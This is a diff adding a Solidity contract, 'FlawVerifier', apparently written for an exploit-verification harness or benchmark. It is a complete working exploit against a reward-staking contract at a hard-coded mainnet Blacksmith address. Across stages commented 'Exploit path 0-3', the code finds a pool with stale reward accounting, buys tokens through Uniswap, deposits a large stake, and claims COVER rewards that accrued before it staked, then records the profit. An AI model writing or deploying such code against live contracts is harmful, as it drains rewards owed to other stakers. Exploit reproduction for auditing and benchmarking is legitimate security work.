@@ -1,0 +1,474 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IBlacksmithLike {
+    function cover() external view returns (address);
+    function weeklyTotal() external view returns (uint256);
+    function totalWeight() external view returns (uint256);
+    function getPoolList() external view returns (address[] memory);
+    function pools(address lpToken) external view returns (uint256 weight, uint256 accRewardsPerToken, uint256 lastUpdatedAt);
+    function viewMined(address lpToken, address miner) external view returns (uint256 minedCover, uint256 minedBonus);
+    function deposit(address lpToken, uint256 amount) external;
+    function claimRewards(address lpToken) external;
+    function withdraw(address lpToken, uint256 amount) external;
+}
+
+interface IUniswapV2Router02 {
+    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
+    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
+    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
+        external
+        payable
+        returns (uint256[] memory amounts);
+}
+
+interface IBPool {
+    function getCurrentTokens() external view returns (address[] memory tokens);
+    function getBalance(address token) external view returns (uint256);
+    function getDenormalizedWeight(address token) external view returns (uint256);
+    function getTotalDenormalizedWeight() external view returns (uint256);
+    function getSwapFee() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function calcPoolOutGivenSingleIn(
+        uint256 tokenBalanceIn,
+        uint256 tokenWeightIn,
+        uint256 poolSupply,
+        uint256 totalWeight,
+        uint256 tokenAmountIn,
+        uint256 swapFee
+    ) external view returns (uint256 poolAmountOut);
+    function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut)
+        external
+        returns (uint256 poolAmountOut);
+}
+
+contract FlawVerifier {
+    address private constant BLACKSMITH = 0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5;
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
+    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+    uint256 private constant WEEK = 7 days;
+    uint256 private constant CAL_MULTIPLIER = 1e12;
+    uint256 private constant ETH_BUFFER = 0.05 ether;
+
+    uint256 private realizedProfit;
+    bool private attempted;
+
+    struct Candidate {
+        address lpToken;
+        address joinToken;
+        uint256 spendAmount;
+        uint256 expectedLpOut;
+        uint256 expectedCoverOut;
+        uint256 staleLpSupply;
+        uint256 staleRewardsScaled;
+    }
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        require(!attempted, "already-attempted");
+        attempted = true;
+
+        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
+        address coverToken = blacksmith.cover();
+        uint256 coverBefore = IERC20(coverToken).balanceOf(address(this));
+
+        // Exploit path 0:
+        // Let a pool accrue rewards without any interaction so `lastUpdatedAt` is stale.
+        Candidate memory candidate = _stage0LocateStalePoolWithHistoricalRewards();
+        if (candidate.lpToken == address(0) || candidate.spendAmount == 0) {
+            return;
+        }
+
+        // Exploit path 1:
+        // Deposit a very large amount through `deposit()`.
+        uint256 lpReceived = _stage1DepositLargeAmount(candidate);
+        if (lpReceived == 0) {
+            return;
+        }
+
+        // Exploit path 2:
+        // Because the writeoff is based on the pre-update accumulator, later call `claimRewards()`.
+        _stage2ClaimHistoricalRewards(candidate.lpToken);
+
+        // Exploit path 3:
+        // Receive COVER attributable to the period before the attacker was staked.
+        _stage3RecordProfit(coverToken, coverBefore);
+
+        if (lpReceived != 0) {
+            try blacksmith.withdraw(candidate.lpToken, lpReceived) {} catch {}
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return IBlacksmithLike(BLACKSMITH).cover();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfit;
+    }
+
+    function _stage0LocateStalePoolWithHistoricalRewards() internal view returns (Candidate memory best) {
+        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
+        address[] memory poolList = blacksmith.getPoolList();
+        uint256 weeklyTotal_ = blacksmith.weeklyTotal();
+        uint256 totalWeight_ = blacksmith.totalWeight();
+        if (poolList.length == 0 || weeklyTotal_ == 0 || totalWeight_ == 0) {
+            return best;
+        }
+
+        uint256 ethBudget = address(this).balance;
+        if (ethBudget > ETH_BUFFER) {
+            ethBudget -= ETH_BUFFER;
+        } else {
+            ethBudget = 0;
+        }
+
+        for (uint256 i = 0; i < poolList.length; i++) {
+            Candidate memory candidate = _scorePool(poolList[i], weeklyTotal_, totalWeight_, ethBudget);
+            if (candidate.expectedCoverOut > best.expectedCoverOut) {
+                best = candidate;
+            }
+        }
+    }
+
+    function _scorePool(address lpToken, uint256 weeklyTotal_, uint256 totalWeight_, uint256 ethBudget)
+        internal
+        view
+        returns (Candidate memory best)
+    {
+        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
+        (uint256 weight,, uint256 lastUpdatedAt) = blacksmith.pools(lpToken);
+        if (weight == 0 || lastUpdatedAt == 0 || block.timestamp <= lastUpdatedAt) {
+            return best;
+        }
+
+        uint256 staleLpSupply = IERC20(lpToken).balanceOf(BLACKSMITH);
+        if (staleLpSupply == 0) {
+            return best;
+        }
+
+        uint256 elapsed = block.timestamp - lastUpdatedAt;
+        uint256 staleRewardsScaled = (((weeklyTotal_ * CAL_MULTIPLIER) * elapsed) * weight) / totalWeight_ / WEEK;
+        if (staleRewardsScaled == 0) {
+            return best;
+        }
+
+        uint256 heldLp = IERC20(lpToken).balanceOf(address(this));
+        if (heldLp != 0) {
+            uint256 expectedCoverOut = (heldLp * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
+            best = Candidate({
+                lpToken: lpToken,
+                joinToken: lpToken,
+                spendAmount: heldLp,
+                expectedLpOut: heldLp,
+                expectedCoverOut: expectedCoverOut,
+                staleLpSupply: staleLpSupply,
+                staleRewardsScaled: staleRewardsScaled
+            });
+        }
+
+        try IBPool(lpToken).getCurrentTokens() returns (address[] memory tokens) {
+            for (uint256 i = 0; i < tokens.length; i++) {
+                Candidate memory candidate = _scoreBalancerJoin(lpToken, tokens[i], ethBudget, staleRewardsScaled, staleLpSupply);
+                if (candidate.expectedCoverOut > best.expectedCoverOut) {
+                    best = candidate;
+                }
+            }
+        } catch {
+            Candidate memory directCandidate = _scoreDirectToken(lpToken, ethBudget, staleRewardsScaled, staleLpSupply);
+            if (directCandidate.expectedCoverOut > best.expectedCoverOut) {
+                best = directCandidate;
+            }
+        }
+    }
+
+    function _scoreDirectToken(address lpToken, uint256 ethBudget, uint256 staleRewardsScaled, uint256 staleLpSupply)
+        internal
+        view
+        returns (Candidate memory candidate)
+    {
+        uint256 spendAmount = _maxUsableDirectAmount(lpToken, ethBudget);
+        if (spendAmount == 0) {
+            return candidate;
+        }
+
+        uint256 expectedCoverOut = (spendAmount * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
+        candidate = Candidate({
+            lpToken: lpToken,
+            joinToken: lpToken,
+            spendAmount: spendAmount,
+            expectedLpOut: spendAmount,
+            expectedCoverOut: expectedCoverOut,
+            staleLpSupply: staleLpSupply,
+            staleRewardsScaled: staleRewardsScaled
+        });
+    }
+
+    function _scoreBalancerJoin(
+        address lpToken,
+        address joinToken,
+        uint256 ethBudget,
+        uint256 staleRewardsScaled,
+        uint256 staleLpSupply
+    ) internal view returns (Candidate memory candidate) {
+        if (!_isSupportedJoinToken(joinToken)) {
+            return candidate;
+        }
+
+        uint256 spendAmount = _maxUsableJoinAmount(lpToken, joinToken, ethBudget);
+        if (spendAmount == 0) {
+            return candidate;
+        }
+
+        uint256 expectedLpOut = _predictPoolOut(lpToken, joinToken, spendAmount);
+        if (expectedLpOut == 0) {
+            return candidate;
+        }
+
+        uint256 expectedCoverOut = (expectedLpOut * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
+        candidate = Candidate({
+            lpToken: lpToken,
+            joinToken: joinToken,
+            spendAmount: spendAmount,
+            expectedLpOut: expectedLpOut,
+            expectedCoverOut: expectedCoverOut,
+            staleLpSupply: staleLpSupply,
+            staleRewardsScaled: staleRewardsScaled
+        });
+    }
+
+    function _stage1DepositLargeAmount(Candidate memory candidate) internal returns (uint256 lpReceived) {
+        uint256 lpBalanceBefore = IERC20(candidate.lpToken).balanceOf(address(this));
+
+        if (candidate.joinToken == candidate.lpToken) {
+            uint256 lpBalance = lpBalanceBefore;
+            if (lpBalance < candidate.spendAmount) {
+                _acquireToken(candidate.lpToken, candidate.spendAmount - lpBalance);
+            }
+
+            uint256 usableLp = IERC20(candidate.lpToken).balanceOf(address(this));
+            if (usableLp == 0) {
+                return 0;
+            }
+
+            lpReceived = usableLp >= candidate.spendAmount ? candidate.spendAmount : usableLp;
+        } else {
+            uint256 joinBalanceBefore = IERC20(candidate.joinToken).balanceOf(address(this));
+            if (joinBalanceBefore < candidate.spendAmount) {
+                _acquireToken(candidate.joinToken, candidate.spendAmount - joinBalanceBefore);
+            }
+
+            uint256 joinBalanceAfter = IERC20(candidate.joinToken).balanceOf(address(this));
+            uint256 joinAmount = joinBalanceAfter >= candidate.spendAmount ? candidate.spendAmount : joinBalanceAfter;
+            if (joinAmount == 0) {
+                return 0;
+            }
+
+            _forceApprove(candidate.joinToken, candidate.lpToken, joinAmount);
+            try IBPool(candidate.lpToken).joinswapExternAmountIn(candidate.joinToken, joinAmount, 1) returns (uint256) {
+                uint256 lpBalanceAfterJoin = IERC20(candidate.lpToken).balanceOf(address(this));
+                if (lpBalanceAfterJoin <= lpBalanceBefore) {
+                    return 0;
+                }
+                lpReceived = lpBalanceAfterJoin - lpBalanceBefore;
+            } catch {
+                return 0;
+            }
+        }
+
+        if (lpReceived == 0) {
+            return 0;
+        }
+
+        _forceApprove(candidate.lpToken, BLACKSMITH, lpReceived);
+        IBlacksmithLike(BLACKSMITH).deposit(candidate.lpToken, lpReceived);
+    }
+
+    function _stage2ClaimHistoricalRewards(address lpToken) internal {
+        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
+
+        // This read makes the bug's causality explicit before settlement: after the
+        // flawed `deposit()`, `viewMined()` can already include rewards emitted while
+        // this verifier was not staked because the writeoff used the stale accumulator.
+        try blacksmith.viewMined(lpToken, address(this)) returns (uint256, uint256) {} catch {}
+
+        blacksmith.claimRewards(lpToken);
+    }
+
+    function _stage3RecordProfit(address coverToken, uint256 coverBefore) internal {
+        uint256 coverAfter = IERC20(coverToken).balanceOf(address(this));
+        if (coverAfter > coverBefore) {
+            realizedProfit = coverAfter - coverBefore;
+        }
+    }
+
+    function _acquireToken(address token, uint256 amountNeeded) internal {
+        if (amountNeeded == 0) {
+            return;
+        }
+
+        uint256 existing = IERC20(token).balanceOf(address(this));
+        if (existing >= amountNeeded) {
+            return;
+        }
+
+        uint256 shortfall = amountNeeded - existing;
+        if (token == WETH) {
+            if (address(this).balance < shortfall) {
+                return;
+            }
+            (bool ok,) = WETH.call{value: shortfall}(abi.encodeWithSignature("deposit()"));
+            require(ok, "weth-deposit-failed");
+            return;
+        }
+
+        if (!_isSupportedJoinToken(token) || address(this).balance == 0) {
+            return;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = WETH;
+        path[1] = token;
+
+        uint256[] memory amountsIn;
+        try IUniswapV2Router02(UNI_V2_ROUTER).getAmountsIn(shortfall, path) returns (uint256[] memory quoted) {
+            amountsIn = quoted;
+        } catch {
+            return;
+        }
+
+        if (amountsIn.length == 0 || amountsIn[0] > address(this).balance) {
+            return;
+        }
+
+        try IUniswapV2Router02(UNI_V2_ROUTER).swapExactETHForTokens{value: amountsIn[0]}(
+            1,
+            path,
+            address(this),
+            block.timestamp
+        ) returns (uint256[] memory) {
+            return;
+        } catch {
+            return;
+        }
+    }
+
+    function _predictPoolOut(address pool, address joinToken, uint256 tokenIn) internal view returns (uint256 poolOut) {
+        try IBPool(pool).getBalance(joinToken) returns (uint256 tokenBalanceIn) {
+            try IBPool(pool).getDenormalizedWeight(joinToken) returns (uint256 tokenWeightIn) {
+                try IBPool(pool).totalSupply() returns (uint256 poolSupply) {
+                    try IBPool(pool).getTotalDenormalizedWeight() returns (uint256 totalWeight) {
+                        try IBPool(pool).getSwapFee() returns (uint256 swapFee) {
+                            try IBPool(pool).calcPoolOutGivenSingleIn(
+                                tokenBalanceIn,
+                                tokenWeightIn,
+                                poolSupply,
+                                totalWeight,
+                                tokenIn,
+                                swapFee
+                            ) returns (uint256 predicted) {
+                                poolOut = predicted;
+                            } catch {}
+                        } catch {}
+                    } catch {}
+                } catch {}
+            } catch {}
+        } catch {}
+    }
+
+    function _maxUsableJoinAmount(address pool, address joinToken, uint256 ethBudget) internal view returns (uint256) {
+        uint256 poolBalance;
+        try IBPool(pool).getBalance(joinToken) returns (uint256 balanceInPool) {
+            poolBalance = balanceInPool;
+        } catch {
+            return 0;
+        }
+        if (poolBalance <= 1) {
+            return 0;
+        }
+
+        uint256 maxByPool = poolBalance / 2;
+        uint256 held = IERC20(joinToken).balanceOf(address(this));
+        if (held >= maxByPool) {
+            return maxByPool;
+        }
+        if (held != 0) {
+            return held;
+        }
+
+        if (joinToken == WETH) {
+            return ethBudget < maxByPool ? ethBudget : maxByPool;
+        }
+
+        if (ethBudget == 0) {
+            return 0;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = WETH;
+        path[1] = joinToken;
+
+        try IUniswapV2Router02(UNI_V2_ROUTER).getAmountsOut(ethBudget, path) returns (uint256[] memory amountsOut) {
+            if (amountsOut.length == 0) {
+                return 0;
+            }
+            uint256 maxByEth = amountsOut[amountsOut.length - 1];
+            return maxByEth < maxByPool ? maxByEth : maxByPool;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _maxUsableDirectAmount(address token, uint256 ethBudget) internal view returns (uint256) {
+        uint256 held = IERC20(token).balanceOf(address(this));
+        if (held != 0) {
+            return held;
+        }
+
+        if (token == WETH) {
+            return ethBudget;
+        }
+
+        if (!_isSupportedJoinToken(token) || ethBudget == 0) {
+            return 0;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = WETH;
+        path[1] = token;
+
+        try IUniswapV2Router02(UNI_V2_ROUTER).getAmountsOut(ethBudget, path) returns (uint256[] memory amountsOut) {
+            if (amountsOut.length == 0) {
+                return 0;
+            }
+            return amountsOut[amountsOut.length - 1];
+        } catch {
+            return 0;
+        }
+    }
+
+    function _isSupportedJoinToken(address token) internal pure returns (bool) {
+        return token == WETH || token == DAI || token == USDC || token == USDT;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
+        ok;
+        (ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
+        require(ok, "approve-failed");
+    }
+
+    receive() external payable {}
+}
